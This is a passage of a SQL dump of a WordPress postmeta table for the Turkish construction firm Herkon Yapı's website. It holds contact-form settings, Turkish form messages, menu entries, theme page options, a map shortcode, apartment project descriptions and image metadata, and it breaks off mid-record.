INSERT INTO `cmrfu_postmeta` VALUES("3","4","_mail","a:8:{s:7:\"subject\";s:23:\"Herkon İletişim Formu\";s:6:\"sender\";s:19:\"info@herkonyapi.com\";s:4:\"body\";s:83:\"isim: [your-name]

email: [your-email]

konu: [your-subject]

ileti: [your-message]\";s:9:\"recipient\";s:19:\"info@herkonyapi.com\";s:18:\"additional_headers\";s:0:\"\";s:11:\"attachments\";s:0:\"\";s:8:\"use_html\";b:1;s:13:\"exclude_blank\";b:0;}");
INSERT INTO `cmrfu_postmeta` VALUES("4","4","_mail_2","a:9:{s:6:\"active\";b:0;s:7:\"subject\";s:0:\"\";s:6:\"sender\";s:0:\"\";s:4:\"body\";s:0:\"\";s:9:\"recipient\";s:0:\"\";s:18:\"additional_headers\";s:0:\"\";s:11:\"attachments\";s:0:\"\";s:8:\"use_html\";b:0;s:13:\"exclude_blank\";b:0;}");
INSERT INTO `cmrfu_postmeta` VALUES("5","4","_messages","a:21:{s:12:\"mail_sent_ok\";s:56:\"İletiniz başarılı olarak gönderildi. Teşekkürler.\";s:12:\"mail_sent_ng\";s:133:\"İletinizi gönderme başarısız oldu. Lütfen daha sonra tekrar deneyin ya da yönetici ile başka bir yöntemle iletişime geçin.\";s:16:\"validation_error\";s:85:\"Onaylama hataları meydana geldi. Lütfen alanları doğrulayın ve tekrar gönderin.\";s:4:\"spam\";s:133:\"İletinizi gönderme başarısız oldu. Lütfen daha sonra tekrar deneyin ya da yönetici ile başka bir yöntemle iletişime geçin.\";s:12:\"accept_terms\";s:48:\"İlerlemek için lütfen koşulları kabul edin.\";s:16:\"invalid_required\";s:35:\"Lütfen gerekli alanları doldurun.\";s:17:\"captcha_not_match\";s:30:\"Girdiğiniz kod doğru değil.\";s:14:\"invalid_number\";s:37:\"Sayı biçimi geçersiz görünüyor.\";s:16:\"number_too_small\";s:23:\"Bu sayı çok küçük.\";s:16:\"number_too_large\";s:22:\"Bu sayı çok büyük.\";s:13:\"invalid_email\";s:37:\"Eposta adresi geçersiz görünüyor.\";s:11:\"invalid_url\";s:27:\"URL geçersiz görünüyor.\";s:11:\"invalid_tel\";s:41:\"Telefon numarası geçersiz görünüyor.\";s:23:\"quiz_answer_not_correct\";s:27:\"Yanıtınız doğru değil.\";s:12:\"invalid_date\";s:37:\"Tarih biçimi geçersiz görünüyor.\";s:14:\"date_too_early\";s:20:\"Bu tarih çok erken.\";s:13:\"date_too_late\";s:19:\"Bu tarih çok geç.\";s:13:\"upload_failed\";s:29:\"Dosya gönderme başarısız.\";s:24:\"upload_file_type_invalid\";s:34:\"Bu dosya türüne izin verilmiyor.\";s:21:\"upload_file_too_large\";s:22:\"Bu dosya çok büyük.\";s:23:\"upload_failed_php_error\";s:49:\"Dosya gönderme başarısız. Hata meydana geldi.\";}");
INSERT INTO `cmrfu_postmeta` VALUES("6","4","_additional_settings","");
INSERT INTO `cmrfu_postmeta` VALUES("7","4","_locale","tr_TR");
INSERT INTO `cmrfu_postmeta` VALUES("1491","710","_menu_item_custom","");
INSERT INTO `cmrfu_postmeta` VALUES("2015","948","_menu_item_custom","");
INSERT INTO `cmrfu_postmeta` VALUES("2016","950","_menu_item_type","custom");
INSERT INTO `cmrfu_postmeta` VALUES("2017","950","_menu_item_menu_item_parent","0");
INSERT INTO `cmrfu_postmeta` VALUES("2018","950","_menu_item_object_id","950");
INSERT INTO `cmrfu_postmeta` VALUES("2019","950","_menu_item_object","custom");
INSERT INTO `cmrfu_postmeta` VALUES("2020","950","_menu_item_target","");
INSERT INTO `cmrfu_postmeta` VALUES("2029","952","_wp_attachment_metadata","a:5:{s:5:\"width\";i:173;s:6:\"height\";i:108;s:4:\"file\";s:29:\"2014/08/canakkale_seramik.png\";s:5:\"sizes\";a:3:{s:9:\"thumbnail\";a:4:{s:4:\"file\";s:29:\"canakkale_seramik-150x108.png\";s:5:\"width\";i:150;s:6:\"height\";i:108;s:9:\"mime-type\";s:9:\"image/png\";}s:12:\"relates-post\";a:4:{s:4:\"file\";s:29:\"canakkale_seramik-170x105.png\";s:5:\"width\";i:170;s:6:\"height\";i:105;s:9:\"mime-type\";s:9:\"image/png\";}s:11:\"recent-post\";a:4:{s:4:\"file\";s:27:\"canakkale_seramik-85x85.png\";s:5:\"width\";i:85;s:6:\"height\";i:85;s:9:\"mime-type\";s:9:\"image/png\";}}s:10:\"image_meta\";a:10:{s:8:\"aperture\";i:0;s:6:\"credit\";s:0:\"\";s:6:\"camera\";s:0:\"\";s:7:\"caption\";s:0:\"\";s:17:\"created_timestamp\";i:0;s:9:\"copyright\";s:0:\"\";s:12:\"focal_length\";i:0;s:3:\"iso\";i:0;s:13:\"shutter_speed\";i:0;s:5:\"title\";s:0:\"\";}}");
INSERT INTO `cmrfu_postmeta` VALUES("2028","952","_wp_attached_file","2014/08/canakkale_seramik.png");
INSERT INTO `cmrfu_postmeta` VALUES("2025","950","_menu_item_custom","");
INSERT INTO `cmrfu_postmeta` VALUES("2023","950","_menu_item_url","#");
INSERT INTO `cmrfu_postmeta` VALUES("2022","950","_menu_item_xfn","");
INSERT INTO `cmrfu_postmeta` VALUES("2021","950","_menu_item_classes","a:1:{i:0;s:0:\"\";}");
INSERT INTO `cmrfu_postmeta` VALUES("2014","949","_menu_item_custom","");
INSERT INTO `cmrfu_postmeta` VALUES("2012","949","_menu_item_url","");
INSERT INTO `cmrfu_postmeta` VALUES("2011","949","_menu_item_xfn","");
INSERT INTO `cmrfu_postmeta` VALUES("44","11","_menu_item_type","custom");
INSERT INTO `cmrfu_postmeta` VALUES("45","11","_menu_item_menu_item_parent","0");
INSERT INTO `cmrfu_postmeta` VALUES("46","11","_menu_item_object_id","11");
INSERT INTO `cmrfu_postmeta` VALUES("47","11","_menu_item_object","custom");
INSERT INTO `cmrfu_postmeta` VALUES("48","11","_menu_item_target","");
INSERT INTO `cmrfu_postmeta` VALUES("49","11","_menu_item_classes","a:1:{i:0;s:0:\"\";}");
INSERT INTO `cmrfu_postmeta` VALUES("50","11","_menu_item_xfn","");
INSERT INTO `cmrfu_postmeta` VALUES("51","11","_menu_item_url","#");
INSERT INTO `cmrfu_postmeta` VALUES("52","12","_menu_item_type","custom");
INSERT INTO `cmrfu_postmeta` VALUES("53","12","_menu_item_menu_item_parent","0");
INSERT INTO `cmrfu_postmeta` VALUES("54","12","_menu_item_object_id","12");
INSERT INTO `cmrfu_postmeta` VALUES("55","12","_menu_item_object","custom");
INSERT INTO `cmrfu_postmeta` VALUES("56","12","_menu_item_target","");
INSERT INTO `cmrfu_postmeta` VALUES("57","12","_menu_item_classes","a:1:{i:0;s:0:\"\";}");
INSERT INTO `cmrfu_postmeta` VALUES("58","12","_menu_item_xfn","");
INSERT INTO `cmrfu_postmeta` VALUES("59","12","_menu_item_url","#");
INSERT INTO `cmrfu_postmeta` VALUES("60","13","_menu_item_type","custom");
INSERT INTO `cmrfu_postmeta` VALUES("61","13","_menu_item_menu_item_parent","0");
INSERT INTO `cmrfu_postmeta` VALUES("62","13","_menu_item_object_id","13");
INSERT INTO `cmrfu_postmeta` VALUES("63","13","_menu_item_object","custom");
INSERT INTO `cmrfu_postmeta` VALUES("64","13","_menu_item_target","");
INSERT INTO `cmrfu_postmeta` VALUES("65","13","_menu_item_classes","a:1:{i:0;s:0:\"\";}");
INSERT INTO `cmrfu_postmeta` VALUES("66","13","_menu_item_xfn","");
INSERT INTO `cmrfu_postmeta` VALUES("67","13","_menu_item_url","#");
INSERT INTO `cmrfu_postmeta` VALUES("68","14","_menu_item_type","custom");
INSERT INTO `cmrfu_postmeta` VALUES("69","14","_menu_item_menu_item_parent","0");
INSERT INTO `cmrfu_postmeta` VALUES("70","14","_menu_item_object_id","14");
INSERT INTO `cmrfu_postmeta` VALUES("71","14","_menu_item_object","custom");
INSERT INTO `cmrfu_postmeta` VALUES("72","14","_menu_item_target","");
INSERT INTO `cmrfu_postmeta` VALUES("73","14","_menu_item_classes","a:1:{i:0;s:0:\"\";}");
INSERT INTO `cmrfu_postmeta` VALUES("74","14","_menu_item_xfn","");
INSERT INTO `cmrfu_postmeta` VALUES("75","14","_menu_item_url","http://everislabs.com/themes/er-leaf/portfolio/");
INSERT INTO `cmrfu_postmeta` VALUES("377","447","_edit_last","1");
INSERT INTO `cmrfu_postmeta` VALUES("378","447","er_leaf_page_sidebar","fullwidth");
INSERT INTO `cmrfu_postmeta` VALUES("379","447","er_leaf_page_heading","1");
INSERT INTO `cmrfu_postmeta` VALUES("380","447","er_leaf_page_title","0");
INSERT INTO `cmrfu_postmeta` VALUES("381","447","er_leaf_page_share","1");
INSERT INTO `cmrfu_postmeta` VALUES("382","447","er_leaf_portfolio_columns","col-3");
INSERT INTO `cmrfu_postmeta` VALUES("383","447","er_leaf_portfolio_item_per_page","12");
INSERT INTO `cmrfu_postmeta` VALUES("384","447","_wp_page_template","default");
INSERT INTO `cmrfu_postmeta` VALUES("385","447","er_leaf_revolutionslider","0");
INSERT INTO `cmrfu_postmeta` VALUES("386","447","er_leaf_heading_custom_code","[map lat=\"41.043189\" lon=\"29.000523\" id=\"map\" z=\"14\" w=\"100%\" h=\"350\" maptype=\"ROADMAP\" address=\"Nüzhetiye Caddesi Istanbul \" kml=\"\" marker=\"yes\" markerimage=\"\" traffic=\"no\" bike=\"no\" infowindown=\"Herkon Yapı<br />Beşiktaş <br />İstanbul \" infowindowndefault=\"yes\" directions=\"\" hidecontrols=\"false\" scale=\"false\" scrollwheel=\"true\" style=\"\"][/map]");
INSERT INTO `cmrfu_postmeta` VALUES("387","447","er_leaf_portfolio_enable_filter","0");
INSERT INTO `cmrfu_postmeta` VALUES("388","447","sbg_selected_sidebar","a:1:{i:0;s:1:\"0\";}");
INSERT INTO `cmrfu_postmeta` VALUES("389","447","sbg_selected_sidebar_replacement","a:1:{i:0;s:27:\"Default Sidebar Widget Area\";}");
INSERT INTO `cmrfu_postmeta` VALUES("390","454","_edit_last","1");
INSERT INTO `cmrfu_postmeta` VALUES("391","454","er_leaf_page_sidebar","content-sidebar");
INSERT INTO `cmrfu_postmeta` VALUES("392","454","er_leaf_page_heading","1");
INSERT INTO `cmrfu_postmeta` VALUES("393","454","er_leaf_page_title","1");
INSERT INTO `cmrfu_postmeta` VALUES("394","454","er_leaf_page_share","1");
INSERT INTO `cmrfu_postmeta` VALUES("395","454","er_leaf_portfolio_columns","col-3");
INSERT INTO `cmrfu_postmeta` VALUES("396","454","er_leaf_portfolio_item_per_page","12");
INSERT INTO `cmrfu_postmeta` VALUES("397","454","_wp_page_template","default");
INSERT INTO `cmrfu_postmeta` VALUES("398","454","sbg_selected_sidebar","a:1:{i:0;s:1:\"0\";}");
INSERT INTO `cmrfu_postmeta` VALUES("399","454","sbg_selected_sidebar_replacement","a:1:{i:0;s:27:\"Default Sidebar Widget Area\";}");
INSERT INTO `cmrfu_postmeta` VALUES("400","497","_edit_last","1");
INSERT INTO `cmrfu_postmeta` VALUES("401","497","er_leaf_page_sidebar","fullwidth");
INSERT INTO `cmrfu_postmeta` VALUES("402","497","er_leaf_page_heading","1");
INSERT INTO `cmrfu_postmeta` VALUES("403","497","er_leaf_page_title","0");
INSERT INTO `cmrfu_postmeta` VALUES("404","497","er_leaf_page_share","1");
INSERT INTO `cmrfu_postmeta` VALUES("405","497","er_leaf_portfolio_columns","col-3");
INSERT INTO `cmrfu_postmeta` VALUES("406","497","er_leaf_portfolio_item_per_page","12");
INSERT INTO `cmrfu_postmeta` VALUES("407","497","_wp_page_template","default");
INSERT INTO `cmrfu_postmeta` VALUES("408","497","er_leaf_revolutionslider","0");
INSERT INTO `cmrfu_postmeta` VALUES("409","497","er_leaf_portfolio_enable_filter","0");
INSERT INTO `cmrfu_postmeta` VALUES("410","497","sbg_selected_sidebar","a:1:{i:0;s:1:\"0\";}");
INSERT INTO `cmrfu_postmeta` VALUES("411","497","sbg_selected_sidebar_replacement","a:1:{i:0;s:27:\"Default Sidebar Widget Area\";}");
INSERT INTO `cmrfu_postmeta` VALUES("425","524","_edit_last","1");
INSERT INTO `cmrfu_postmeta` VALUES("426","524","er_leaf_page_sidebar","fullwidth");
INSERT INTO `cmrfu_postmeta` VALUES("427","524","er_leaf_page_heading","0");
INSERT INTO `cmrfu_postmeta` VALUES("428","524","er_leaf_page_title","0");
INSERT INTO `cmrfu_postmeta` VALUES("429","524","er_leaf_page_share","1");
INSERT INTO `cmrfu_postmeta` VALUES("430","524","er_leaf_portfolio_columns","col-3");
INSERT INTO `cmrfu_postmeta` VALUES("431","524","er_leaf_portfolio_item_per_page","12");
INSERT INTO `cmrfu_postmeta` VALUES("432","524","_wp_page_template","default");
INSERT INTO `cmrfu_postmeta` VALUES("433","524","er_leaf_revolutionslider","home");
INSERT INTO `cmrfu_postmeta` VALUES("434","524","er_leaf_portfolio_enable_filter","0");
INSERT INTO `cmrfu_postmeta` VALUES("435","524","sbg_selected_sidebar","a:1:{i:0;s:1:\"0\";}");
INSERT INTO `cmrfu_postmeta` VALUES("436","524","sbg_selected_sidebar_replacement","a:1:{i:0;s:27:\"Default Sidebar Widget Area\";}");
INSERT INTO `cmrfu_postmeta` VALUES("473","141","_edit_last","1");
INSERT INTO `cmrfu_postmeta` VALUES("474","141","er_leaf_project_detail","<p>Şişli Fikri Bey Apt. Arka Dubleks</p>
");
INSERT INTO `cmrfu_postmeta` VALUES("1844","904","_wp_attached_file","2013/10/107.jpg");
INSERT INTO `cmrfu_postmeta` VALUES("1845","904","_wp_attachment_metadata","a:5:{s:5:\"width\";i:450;s:6:\"height\";i:600;s:4:\"file\";s:15:\"2013/10/107.jpg\";s:5:\"sizes\";a:6:{s:9:\"thumbnail\";a:4:{s:4:\"file\";s:15:\"107-150x150.jpg\";s:5:\"width\";i:150;s:6:\"height\";i:150;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:6:\"medium\";a:4:{s:4:\"file\";s:15:\"107-225x300.jpg\";s:5:\"width\";i:225;s:6:\"height\";i:300;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:4:\"post\";a:4:{s:4:\"file\";s:15:\"107-450x230.jpg\";s:5:\"width\";i:450;s:6:\"height\";i:230;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:9:\"portfolio\";a:4:{s:4:\"file\";s:15:\"107-450x535.jpg\";s:5:\"width\";i:450;s:6:\"height\";i:535;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:12:\"relates-post\";a:4:{s:4:\"file\";s:15:\"107-170x105.jpg\";s:5:\"width\";i:170;s:6:\"height\";i:105;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:11:\"recent-post\";a:4:{s:4:\"file\";s:13:\"107-85x85.jpg\";s:5:\"width\";i:85;s:6:\"height\";i:85;s:9:\"mime-type\";s:10:\"image/jpeg\";}}s:10:\"image_meta\";a:10:{s:8:\"aperture\";i:0;s:6:\"credit\";s:0:\"\";s:6:\"camera\";s:0:\"\";s:7:\"caption\";s:0:\"\";s:17:\"created_timestamp\";i:0;s:9:\"copyright\";s:0:\"\";s:12:\"focal_length\";i:0;s:3:\"iso\";i:0;s:13:\"shutter_speed\";i:0;s:5:\"title\";s:0:\"\";}}");
INSERT INTO `cmrfu_postmeta` VALUES("477","141","_thumbnail_id","904");
INSERT INTO `cmrfu_postmeta` VALUES("478","141","er_leaf_project_images","143");
INSERT INTO `cmrfu_postmeta` VALUES("479","141","er_leaf_project_images","144");
INSERT INTO `cmrfu_postmeta` VALUES("480","141","er_leaf_project_images","145");
INSERT INTO `cmrfu_postmeta` VALUES("483","146","er_leaf_project_images","148");
INSERT INTO `cmrfu_postmeta` VALUES("484","146","er_leaf_project_images","149");
INSERT INTO `cmrfu_postmeta` VALUES("485","146","er_leaf_project_images","150");
INSERT INTO `cmrfu_postmeta` VALUES("486","146","_edit_last","1");
INSERT INTO `cmrfu_postmeta` VALUES("487","146","er_leaf_project_detail","<p>Şişli Fikri Bey Apt. Ön Dubleks</p>
");
INSERT INTO `cmrfu_postmeta` VALUES("1829","898","_wp_attached_file","2013/10/25.jpg");
INSERT INTO `cmrfu_postmeta` VALUES("1830","898","_wp_attachment_metadata","a:5:{s:5:\"width\";i:800;s:6:\"height\";i:600;s:4:\"file\";s:14:\"2013/10/25.jpg\";s:5:\"sizes\";a:6:{s:9:\"thumbnail\";a:4:{s:4:\"file\";s:14:\"25-150x150.jpg\";s:5:\"width\";i:150;s:6:\"height\";i:150;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:6:\"medium\";a:4:{s:4:\"file\";s:14:\"25-300x225.jpg\";s:5:\"width\";i:300;s:6:\"height\";i:225;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:4:\"post\";a:4:{s:4:\"file\";s:14:\"25-770x230.jpg\";s:5:\"width\";i:770;s:6:\"height\";i:230;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:9:\"portfolio\";a:4:{s:4:\"file\";s:14:\"25-450x535.jpg\";s:5:\"width\";i:450;s:6:\"height\";i:535;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:12:\"relates-post\";a:4:{s:4:\"file\";s:14:\"25-170x105.jpg\";s:5:\"width\";i:170;s:6:\"height\";i:105;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:11:\"recent-post\";a:4:{s:4:\"file\";s:12:\"25-85x85.jpg\";s:5:\"width\";i:85;s:6:\"height\";i:85;s:9:\"mime-type\";s:10:\"image/jpeg\";}}s:10:\"image_meta\";a:10:{s:8:\"aperture\";i:0;s:6:\"credit\";s:0:\"\";s:6:\"camera\";s:0:\"\";s:7:\"caption\";s:0:\"\";s:17:\"created_timestamp\";i:0;s:9:\"copyright\";s:0:\"\";s:12:\"focal_length\";i:0;s:3:\"iso\";i:0;s:13:\"shutter_speed\";i:0;s:5:\"title\";s:0:\"\";}}");
INSERT INTO `cmrfu_postmeta` VALUES("491","146","er_leaf_project_images","155");
INSERT INTO `cmrfu_postmeta` VALUES("492","146","er_leaf_project_images","154");
INSERT INTO `cmrfu_postmeta` VALUES("493","146","er_leaf_project_images","153");
INSERT INTO `cmrfu_postmeta` VALUES("494","146","er_leaf_project_images","152");
INSERT INTO `cmrfu_postmeta` VALUES("495","146","_thumbnail_id","898");
INSERT INTO `cmrfu_postmeta` VALUES("496","151","_edit_last","1");
INSERT INTO `cmrfu_postmeta` VALUES("497","151","er_leaf_project_detail","<p>Şişli 3+1 Ön Daire</p>
");
INSERT INTO `cmrfu_postmeta` VALUES("1782","882","_wp_attached_file","2013/10/14.jpg");
INSERT INTO `cmrfu_postmeta` VALUES("1783","882","_wp_attachment_metadata","a:5:{s:5:\"width\";i:800;s:6:\"height\";i:600;s:4:\"file\";s:14:\"2013/10/14.jpg\";s:5:\"sizes\";a:6:{s:9:\"thumbnail\";a:4:{s:4:\"file\";s:14:\"14-150x150.jpg\";s:5:\"width\";i:150;s:6:\"height\";i:150;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:6:\"medium\";a:4:{s:4:\"file\";s:14:\"14-300x225.jpg\";s:5:\"width\";i:300;s:6:\"height\";i:225;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:4:\"post\";a:4:{s:4:\"file\";s:14:\"14-770x230.jpg\";s:5:\"width\";i:770;s:6:\"height\";i:230;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:9:\"portfolio\";a:4:{s:4:\"file\";s:14:\"14-450x535.jpg\";s:5:\"width\";i:450;s:6:\"height\";i:535;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:12:\"relates-post\";a:4:{s:4:\"file\";s:14:\"14-170x105.jpg\";s:5:\"width\";i:170;s:6:\"height\";i:105;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:11:\"recent-post\";a:4:{s:4:\"file\";s:12:\"14-85x85.jpg\";s:5:\"width\";i:85;s:6:\"height\";i:85;s:9:\"mime-type\";s:10:\"image/jpeg\";}}s:10:\"image_meta\";a:10:{s:8:\"aperture\";i:0;s:6:\"credit\";s:0:\"\";s:6:\"camera\";s:0:\"\";s:7:\"caption\";s:0:\"\";s:17:\"created_timestamp\";i:0;s:9:\"copyright\";s:0:\"\";s:12:\"focal_length\";i:0;s:3:\"iso\";i:0;s:13:\"shutter_speed\";i:0;s:5:\"title\";s:0:\"\";}}");
INSERT INTO `cmrfu_postmeta` VALUES("502","151","er_leaf_project_images","152");
INSERT INTO `cmrfu_postmeta` VALUES("503","151","er_leaf_project_images","153");
INSERT INTO `cmrfu_postmeta` VALUES("504","151","er_leaf_project_images","154");
INSERT INTO `cmrfu_postmeta` VALUES("505","151","er_leaf_project_images","155");
INSERT INTO `cmrfu_postmeta` VALUES("506","151","_thumbnail_id","892");
INSERT INTO `cmrfu_postmeta` VALUES("507","159","_edit_last","1");
INSERT INTO `cmrfu_postmeta` VALUES("508","159","er_leaf_project_detail","<p>Şişli 3+1 Daire</p>
");
INSERT INTO `cmrfu_postmeta` VALUES("1786","884","_wp_attached_file","2013/10/65.jpg");
INSERT INTO `cmrfu_postmeta` VALUES("1787","884","_wp_attachment_metadata","a:5:{s:5:\"width\";i:800;s:6:\"height\";i:600;s:4:\"file\";s:14:\"2013/10/65.jpg\";s:5:\"sizes\";a:6:{s:9:\"thumbnail\";a:4:{s:4:\"file\";s:14:\"65-150x150.jpg\";s:5:\"width\";i:150;s:6:\"height\";i:150;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:6:\"medium\";a:4:{s:4:\"file\";s:14:\"65-300x225.jpg\";s:5:\"width\";i:300;s:6:\"height\";i:225;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:4:\"post\";a:4:{s:4:\"file\";s:14:\"65-770x230.jpg\";s:5:\"width\";i:770;s:6:\"height\";i:230;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:9:\"portfolio\";a:4:{s:4:\"file\";s:14:\"65-450x535.jpg\";s:5:\"width\";i:450;s:6:\"height\";i:535;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:12:\"relates-post\";a:4:{s:4:\"file\";s:14:\"65-170x105.jpg\";s:5:\"width\";i:170;s:6:\"height\";i:105;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:11:\"recent-post\";a:4:{s:4:\"file\";s:12:\"65-85x85.jpg\";s:5:\"width\";i:85;s:6:\"height\";i:85;s:9:\"mime-type\";s:10:\"image/jpeg\";}}s:10:\"image_meta\";a:10:{s:8:\"aperture\";i:0;s:6:\"credit\";s:0:\"\";s:6:\"camera\";s:0:\"\";s:7:\"caption\";s:0:\"\";s:17:\"created_timestamp\";i:0;s:9:\"copyright\";s:0:\"\";s:12:\"focal_length\";i:0;s:3:\"iso\";i:0;s:13:\"shutter_speed\";i:0;s:5:\"title\";s:0:\"\";}}");
INSERT INTO `cmrfu_postmeta` VALUES("510","159","er_leaf_project_images","155");
INSERT INTO `cmrfu_postmeta` VALUES("511","159","er_leaf_project_images","154");
INSERT INTO `cmrfu_postmeta` VALUES("512","159","er_leaf_project_images","153");
INSERT INTO `cmrfu_postmeta` VALUES("513","159","er_leaf_project_images","160");
INSERT INTO `cmrfu_postmeta` VALUES("514","159","_thumbnail_id","887");
INSERT INTO `cmrfu_postmeta` VALUES("517","162","er_leaf_project_images","163");
INSERT INTO `cmrfu_postmeta` VALUES("518","162","er_leaf_project_images","164");
INSERT INTO `cmrfu_postmeta` VALUES("519","162","_edit_last","1");
INSERT INTO `cmrfu_postmeta` VALUES("520","162","er_leaf_project_detail","<p>Şişli 1+1 Daire</p>
");
INSERT INTO `cmrfu_postmeta` VALUES("523","162","_thumbnail_id","882");
INSERT INTO `cmrfu_postmeta` VALUES("524","166","er_leaf_project_images","164");
INSERT INTO `cmrfu_postmeta` VALUES("525","166","er_leaf_project_images","163");
INSERT INTO `cmrfu_postmeta` VALUES("526","166","_edit_last","1");
INSERT INTO `cmrfu_postmeta` VALUES("527","166","er_leaf_project_detail","<p>Kalıpçı Sokak Sude Apt. Giriş Kat</p>
");
INSERT INTO `cmrfu_postmeta` VALUES("1751","869","_wp_attached_file","2013/10/22.jpg");
INSERT INTO `cmrfu_postmeta` VALUES("1752","869","_wp_attachment_metadata","a:5:{s:5:\"width\";i:800;s:6:\"height\";i:600;s:4:\"file\";s:14:\"2013/10/22.jpg\";s:5:\"sizes\";a:6:{s:9:\"thumbnail\";a:4:{s:4:\"file\";s:14:\"22-150x150.jpg\";s:5:\"width\";i:150;s:6:\"height\";i:150;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:6:\"medium\";a:4:{s:4:\"file\";s:14:\"22-300x225.jpg\";s:5:\"width\";i:300;s:6:\"height\";i:225;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:4:\"post\";a:4:{s:4:\"file\";s:14:\"22-770x230.jpg\";s:5:\"width\";i:770;s:6:\"height\";i:230;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:9:\"portfolio\";a:4:{s:4:\"file\";s:14:\"22-450x535.jpg\";s:5:\"width\";i:450;s:6:\"height\";i:535;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:12:\"relates-post\";a:4:{s:4:\"file\";s:14:\"22-170x105.jpg\";s:5:\"width\";i:170;s:6:\"height\";i:105;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:11:\"recent-post\";a:4:{s:4:\"file\";s:12:\"22-85x85.jpg\";s:5:\"width\";i:85;s:6:\"height\";i:85;s:9:\"mime-type\";s:10:\"image/jpeg\";}}s:10:\"image_meta\";a:10:{s:8:\"aperture\";i:0;s:6:\"credit\";s:0:\"\";s:6:\"camera\";s:0:\"\";s:7:\"caption\";s:0:\"\";s:17:\"created_timestamp\";i:0;s:9:\"copyright\";s:0:\"\";s:12:\"focal_length\";i:0;s:3:\"iso\";i:0;s:13:\"shutter_speed\";i:0;s:5:\"title\";s:0:\"\";}}");
INSERT INTO `cmrfu_postmeta` VALUES("1765","873","_wp_attachment_metadata","a:5:{s:5:\"width\";i:450;s:6:\"height\";i:600;s:4:\"file\";s:15:\"2013/10/102.jpg\";s:5:\"sizes\";a:6:{s:9:\"thumbnail\";a:4:{s:4:\"file\";s:15:\"102-150x150.jpg\";s:5:\"width\";i:150;s:6:\"height\";i:150;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:6:\"medium\";a:4:{s:4:\"file\";s:15:\"102-225x300.jpg\";s:5:\"width\";i:225;s:6:\"height\";i:300;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:4:\"post\";a:4:{s:4:\"file\";s:15:\"102-450x230.jpg\";s:5:\"width\";i:450;s:6:\"height\";i:230;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:9:\"portfolio\";a:4:{s:4:\"file\";s:15:\"102-450x535.jpg\";s:5:\"width\";i:450;s:6:\"height\";i:535;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:12:\"relates-post\";a:4:{s:4:\"file\";s:15:\"102-170x105.jpg\";s:5:\"width\";i:170;s:6:\"height\";i:105;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:11:\"recent-post\";a:4:{s:4:\"file\";s:13:\"102-85x85.jpg\";s:5:\"width\";i:85;s:6:\"height\";i:85;s:9:\"mime-type\";s:10:\"image/jpeg\";}}s:10:\"image_meta\";a:10:{s:8:\"aperture\";i:0;s:6:\"credit\";s:0:\"\";s:6:\"camera\";s:0:\"\";s:7:\"caption\";s:0:\"\";s:17:\"created_timestamp\";i:0;s:9:\"copyright\";s:0:\"\";s:12:\"focal_length\";i:0;s:3:\"iso\";i:0;s:13:\"shutter_speed\";i:0;s:5:\"title\";s:0:\"\";}}");
INSERT INTO `cmrfu_postmeta` VALUES("529","166","er_leaf_project_author","Ti Min");
INSERT INTO `cmrfu_postmeta` VALUES("1764","873","_wp_attached_file","2013/10/102.jpg");
INSERT INTO `cmrfu_postmeta` VALUES("531","166","_thumbnail_id","867");
INSERT INTO `cmrfu_postmeta` VALUES("533","168","er_leaf_project_images","169");
INSERT INTO `cmrfu_postmeta` VALUES("534","168","er_leaf_project_images","171");
INSERT INTO `cmrfu_postmeta` VALUES("535","168","_edit_last","1");
INSERT INTO `cmrfu_postmeta` VALUES("536","168","er_leaf_project_detail","<p>Kalıpçı Sokak Sude Apt. Kat 2</p>
");
INSERT INTO `cmrfu_postmeta` VALUES("1784","883","_wp_attached_file","2013/10/33.jpg");
INSERT INTO `cmrfu_postmeta` VALUES("1785","883","_wp_attachment_metadata","a:5:{s:5:\"width\";i:800;s:6:\"height\";i:600;s:4:\"file\";s:14:\"2013/10/33.jpg\";s:5:\"sizes\";a:6:{s:9:\"thumbnail\";a:4:{s:4:\"file\";s:14:\"33-150x150.jpg\";s:5:\"width\";i:150;s:6:\"height\";i:150;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:6:\"medium\";a:4:{s:4:\"file\";s:14:\"33-300x225.jpg\";s:5:\"width\";i:300;s:6:\"height\";i:225;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:4:\"post\";a:4:{s:4:\"file\";s:14:\"33-770x230.jpg\";s:5:\"width\";i:770;s:6:\"height\";i:230;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:9:\"portfolio\";a:4:{s:4:\"file\";s:14:\"33-450x535.jpg\";s:5:\"width\";i:450;s:6:\"height\";i:535;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:12:\"relates-post\";a:4:{s:4:\"file\";s:14:\"33-170x105.jpg\";s:5:\"width\";i:170;s:6:\"height\";i:105;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:11:\"recent-post\";a:4:{s:4:\"file\";s:12:\"33-85x85.jpg\";s:5:\"width\";i:85;s:6:\"height\";i:85;s:9:\"mime-type\";s:10:\"image/jpeg\";}}s:10:\"image_meta\";a:10:{s:8:\"aperture\";i:0;s:6:\"credit\";s:0:\"\";s:6:\"camera\";s:0:\"\";s:7:\"caption\";s:0:\"\";s:17:\"created_